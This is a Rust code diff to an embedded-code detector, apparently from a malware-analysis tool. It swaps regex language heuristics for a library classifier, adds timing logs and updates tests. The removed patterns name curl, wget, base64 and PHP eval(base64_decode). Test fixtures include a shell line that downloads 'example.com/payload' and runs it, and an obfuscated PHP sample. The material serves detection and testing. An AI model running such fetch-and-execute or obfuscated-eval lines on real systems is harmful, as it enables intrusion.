@@ -37,9 +37,13 @@ const MAX_CODE_ENTROPY: f64 = 7.5;
 
 /// Detect if a string contains code worth analyzing
 ///
-/// Uses fast heuristics to identify Python, JavaScript, Shell, or PHP code.
+/// Uses stng's classification to identify Python, JavaScript, Shell, or PHP code.
+/// For strings extracted by stng, classification is already done (no regex needed).
+/// For strings from tree-sitter AST, we classify using stng::classify_string().
 /// Returns Some(FileType) if code is detected, None otherwise.
-pub fn detect_language(value: &str, is_encoded: bool) -> Option<FileType> {
+pub fn detect_language(string_info: &StringInfo, is_encoded: bool) -> Option<FileType> {
+    let value = &string_info.value;
+
     // Size checks
     let min_size = if is_encoded {
         MIN_ENCODED_SIZE
@@ -56,155 +60,32 @@ pub fn detect_language(value: &str, is_encoded: bool) -> Option<FileType> {
         return None;
     }
 
-    // Pattern threshold (stricter for plain strings)
-    let min_matches = if is_encoded { 2 } else { 3 };
+    // Use stng's classification (either from extraction or by calling classify_string)
+    use crate::types::binary::StringType;
 
-    // PHP detection (check first - <?php is most distinctive marker)
-    if detect_php(value) {
-        return Some(FileType::Php);
-    }
+    let kind = &string_info.string_type;
 
-    // JavaScript detection (check before Python - JS code often has eval() which matches Python)
-    if detect_javascript(value, min_matches) {
-        return Some(FileType::JavaScript);
-    }
-
-    // Python detection
-    if detect_python(value, min_matches) {
-        return Some(FileType::Python);
-    }
-
-    // Shell detection
-    if detect_shell(value, min_matches) {
-        return Some(FileType::Shell);
+    // Check if already classified as code by stng
+    match kind {
+        StringType::PythonCode => return Some(FileType::Python),
+        StringType::JavaScriptCode => return Some(FileType::JavaScript),
+        StringType::PhpCode => return Some(FileType::Php),
+        StringType::ShellCmd => return Some(FileType::Shell),
+        // If not classified as code, classify it now
+        _ => {
+            // Classify using stng (tree-sitter strings come through here)
+            let classified_kind = stng::classify_string(value);
+            match classified_kind {
+                StringType::PythonCode => return Some(FileType::Python),
+                StringType::JavaScriptCode => return Some(FileType::JavaScript),
+                StringType::PhpCode => return Some(FileType::Php),
+                StringType::ShellCmd => return Some(FileType::Shell),
+                _ => {},
+            }
+        },
     }
 
     None
-}
-
-/// Detect Python code patterns
-fn detect_python(value: &str, min_matches: usize) -> bool {
-    let patterns = [
-        r"\bimport\s+\w+",
-        r"\bfrom\s+\w+\s+import\b",
-        r"\bdef\s+\w+\s*\(",
-        r"\bclass\s+\w+",
-        r"\bexec\s*\(",
-        r"\beval\s*\(",
-        r"\bsys\.",
-        r"\bos\.",
-        r#"__name__\s*==\s*['"]__main__['"]"#,
-    ];
-
-    let mut matches = 0;
-    for pattern in &patterns {
-        if let Ok(re) = regex::Regex::new(pattern) {
-            if re.is_match(value) {
-                matches += 1;
-                if matches >= min_matches {
-                    return true;
-                }
-            }
-        }
-    }
-
-    false
-}
-
-/// Detect JavaScript code patterns
-fn detect_javascript(value: &str, min_matches: usize) -> bool {
-    let patterns = [
-        r"\bfunction\s+\w+\s*\(",
-        r"\bconst\s+\w+\s*=",
-        r"\blet\s+\w+\s*=",
-        r"\bvar\s+\w+\s*=",
-        r#"\brequire\s*\(['"]"#,
-        r"\beval\s*\(",
-        r"\bdocument\.",
-        r"\bwindow\.",
-        r"=>\s*\{",
-        r"\bconsole\.log\s*\(",
-    ];
-
-    let mut matches = 0;
-    for pattern in &patterns {
-        if let Ok(re) = regex::Regex::new(pattern) {
-            if re.is_match(value) {
-                matches += 1;
-                if matches >= min_matches {
-                    return true;
-                }
-            }
-        }
-    }
-
-    false
-}
-
-/// Detect Shell script patterns
-fn detect_shell(value: &str, min_matches: usize) -> bool {
-    // Shebang is strong indicator
-    if value.starts_with("#!/bin/bash") || value.starts_with("#!/bin/sh") {
-        return true;
-    }
-
-    let patterns = [
-        r"\b(echo|curl|wget|chmod|chown|chgrp)\s+",
-        r"\|\s*\b(grep|sh|bash|python|php|node|base64|sed|awk)\b",
-        r"\$\{?\w+\}?",
-        r"\bif\s*\[\s*",
-        r"\bfor\s+\w+\s+in\b",
-        r"\bexport\s+\w+=",
-        r"\b(python|php|perl|ruby)\s+-e\s+",
-        r"2>&1",
-        r">/dev/null",
-        r"\b(sudo|doas)\s+",
-        r"&\s*/dev/null",
-        r"\bnohup\s+",
-    ];
-
-    let mut matches = 0;
-    for pattern in &patterns {
-        if let Ok(re) = regex::Regex::new(pattern) {
-            if re.is_match(value) {
-                matches += 1;
-                if matches >= min_matches {
-                    return true;
-                }
-            }
-        }
-    }
-
-    false
-}
-
-/// Detect PHP code patterns
-fn detect_php(value: &str) -> bool {
-    // PHP has very distinctive opening tags - require them for reliable detection
-    if value.contains("<?php") || value.contains("<?=") {
-        return true;
-    }
-
-    // Only use fallback patterns if we see PHP-specific patterns (multiple matches required)
-    let patterns = [
-        r"\$\w+\s*=",                              // PHP variables always start with $
-        r"\beval\s*\(\s*base64_decode",            // Common PHP obfuscation
-        r"function\s+\w+\s*\([^)]*\)\s*\{[^}]*\$", // PHP function with $ variable
-    ];
-
-    let mut matches = 0;
-    for pattern in &patterns {
-        if let Ok(re) = regex::Regex::new(pattern) {
-            if re.is_match(value) {
-                matches += 1;
-                if matches >= 2 {
-                    return true;
-                }
-            }
-        }
-    }
-
-    false
 }
 
 /// Calculate Shannon entropy of data
@@ -321,10 +202,12 @@ pub fn analyze_embedded_string(
         anyhow::bail!("Maximum decode depth {} exceeded", MAX_DECODE_DEPTH);
     }
 
-    // Detect language
+    // Detect language (uses stng classification, no regex needed)
+    let t_detect = std::time::Instant::now();
     let is_encoded = !string_info.encoding_chain.is_empty();
-    let file_type = detect_language(&string_info.value, is_encoded)
-        .context("No language detected in string")?;
+    let file_type =
+        detect_language(string_info, is_encoded).context("No language detected in string")?;
+    let detect_time = t_detect.elapsed();
 
     let offset = string_info.offset.unwrap_or(0);
 
@@ -341,9 +224,21 @@ pub fn analyze_embedded_string(
         .with_capability_mapper_arc(capability_mapper.clone());
 
     // Analyze in-memory
+    let t_analyze = std::time::Instant::now();
     let mut report = analyzer
         .analyze_source(Path::new(&virtual_path), &string_info.value)
         .context("Failed to analyze embedded code")?;
+    let analyze_time = t_analyze.elapsed();
+
+    if analyze_time.as_millis() > 100 {
+        tracing::debug!(
+            "embedded_code_detector: Slow analysis - detect: {:?}, analyze: {:?}, lang: {:?}, size: {}",
+            detect_time,
+            analyze_time,
+            file_type,
+            string_info.value.len()
+        );
+    }
 
     // Generate language detection trait (auto-generated, no YAML needed)
     let lang_trait = generate_language_trait(&file_type, &string_info.encoding_chain, offset);
@@ -404,16 +299,45 @@ pub fn process_all_strings(
     let mut plain_findings = Vec::new();
     let mut total_analyzed = 0;
     let mut total_bytes = 0;
+    let mut detection_attempts = 0;
+    let mut detected_count = 0;
+
+    let t_start = std::time::Instant::now();
+    let total_string_bytes: usize = strings.iter().map(|s| s.value.len()).sum();
+    let max_string_len = strings.iter().map(|s| s.value.len()).max().unwrap_or(0);
+    tracing::debug!(
+        "embedded_code_detector: Processing {} strings (total {} bytes, max {} bytes)",
+        strings.len(),
+        total_string_bytes,
+        max_string_len
+    );
 
     for (idx, string_info) in strings.iter().enumerate() {
         // Check limits
         if total_analyzed >= MAX_STRINGS_TO_ANALYZE {
+            tracing::debug!(
+                "embedded_code_detector: Hit MAX_STRINGS_TO_ANALYZE limit ({} analyzed)",
+                total_analyzed
+            );
             break;
         }
 
         if total_bytes >= MAX_TOTAL_DECODED {
+            tracing::debug!(
+                "embedded_code_detector: Hit MAX_TOTAL_DECODED limit ({} bytes)",
+                total_bytes
+            );
             break;
         }
+
+        // Skip strings that are too large for code detection (likely obfuscated/packed data)
+        // Real code fragments shouldn't be > 1MB
+        const MAX_STRING_SIZE_FOR_DETECTION: usize = 1024 * 1024; // 1MB
+        if string_info.value.len() > MAX_STRING_SIZE_FOR_DETECTION {
+            continue;
+        }
+
+        detection_attempts += 1;
 
         // Try to analyze this string
         match analyze_embedded_string(
@@ -424,21 +348,31 @@ pub fn process_all_strings(
             current_depth,
         ) {
             Ok(EmbeddedAnalysisResult::EncodedLayer(file_analysis)) => {
+                detected_count += 1;
                 total_bytes += string_info.value.len();
                 total_analyzed += 1;
                 encoded_layers.push(*file_analysis);
-            }
+            },
             Ok(EmbeddedAnalysisResult::PlainEmbedded(findings)) => {
+                detected_count += 1;
                 total_bytes += string_info.value.len();
                 total_analyzed += 1;
                 plain_findings.extend(findings);
-            }
+            },
             Err(_) => {
                 // Not code or analysis failed - skip silently
                 continue;
-            }
+            },
         }
     }
+
+    tracing::info!(
+        "embedded_code_detector: Processed {} strings in {:?}, detected {} as code, analyzed {}",
+        detection_attempts,
+        t_start.elapsed(),
+        detected_count,
+        total_analyzed
+    );
 
     (encoded_layers, plain_findings)
 }
@@ -447,11 +381,24 @@ pub fn process_all_strings(
 mod tests {
     use super::*;
 
+    fn make_string_info(value: &str) -> StringInfo {
+        StringInfo {
+            value: value.to_string(),
+            offset: Some(0),
+            string_type: crate::types::binary::StringType::Const,
+            encoding: "utf-8".to_string(),
+            section: None,
+            encoding_chain: Vec::new(),
+            fragments: None,
+        }
+    }
+
     #[test]
     fn test_detect_python() {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
         let code = "import os\nimport sys\ndef main():\n    os.system('ls -la')\n    sys.exit(0)";
-        assert_eq!(detect_language(code, false), Some(FileType::Python));
+        let info = make_string_info(code);
+        assert_eq!(detect_language(&info, false), Some(FileType::Python));
     }
 
     #[test]
@@ -459,7 +406,8 @@ mod tests {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
         let code =
             "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
-        assert_eq!(detect_language(code, false), Some(FileType::JavaScript));
+        let info = make_string_info(code);
+        assert_eq!(detect_language(&info, false), Some(FileType::JavaScript));
     }
 
     #[test]
@@ -467,32 +415,37 @@ mod tests {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
         let code =
             "#!/bin/bash\necho 'hello world'\ncurl http://example.com/payload\nsh -c 'payload'";
-        assert_eq!(detect_language(code, false), Some(FileType::Shell));
+        let info = make_string_info(code);
+        assert_eq!(detect_language(&info, false), Some(FileType::Shell));
     }
 
     #[test]
     fn test_detect_php() {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
         let code = "<?php eval(base64_decode('test')); echo 'malware'; ?>";
-        assert_eq!(detect_language(code, false), Some(FileType::Php));
+        let info = make_string_info(code);
+        assert_eq!(detect_language(&info, false), Some(FileType::Php));
     }
 
     #[test]
     fn test_reject_plain_text() {
         let text = "This is just some regular text without code.";
-        assert_eq!(detect_language(text, false), None);
+        let info = make_string_info(text);
+        assert_eq!(detect_language(&info, false), None);
     }
 
     #[test]
     fn test_reject_too_small() {
         let code = "import os"; // Less than MIN_PLAIN_SIZE
-        assert_eq!(detect_language(code, false), None);
+        let info = make_string_info(code);
+        assert_eq!(detect_language(&info, false), None);
     }
 
     #[test]
     fn test_encoded_lower_threshold() {
         let code = "import os\ndef main():\n    pass"; // Only 1 match
-        assert_eq!(detect_language(code, true), Some(FileType::Python));
+        let info = make_string_info(code);
+        assert_eq!(detect_language(&info, true), Some(FileType::Python));
     }
 
     #[test]
